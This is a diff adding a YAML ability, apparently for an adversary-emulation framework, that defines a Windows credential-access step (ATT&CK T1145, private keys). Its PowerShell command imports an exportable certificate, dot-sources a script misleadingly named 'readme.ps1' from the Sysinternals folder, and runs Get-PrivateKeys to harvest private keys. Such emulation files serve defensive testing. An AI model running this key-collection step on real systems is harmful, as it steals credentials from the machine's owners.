@@ -1,0 +1,29 @@
+---
+- id: c4f4b13c-87b6-498c-b814-93570173068c
+  name: 6.B.1 - Credentials In Files (T1081) - Private Keys Extraction
+  description: Obtain credentials via Custom PowerShell
+  tactic: credential-access
+  technique:
+    attack_id: T1145
+    name: Private Keys
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+            Import-PfxCertificate -Exportable -FilePath ".\dmevals.local.pfx" -CertStoreLocation Cert:\LocalMachine\My;
+
+            if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+            	write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+            	exit 1;
+            }
+            Set-Location -path "C:\Program Files\SysinternalsSuite";
+            . .\readme.ps1;
+            Get-PrivateKeys;
+            if ($? -eq $True) {
+                write-host "[+] Successfully executed private key collection script.";
+                exit 0;
+            } else {
+                write-host "[!] Error, could not execution Get-PrivateKeys.";
+                exit 1;
+            }
+        payload: dmevals.local.pfx
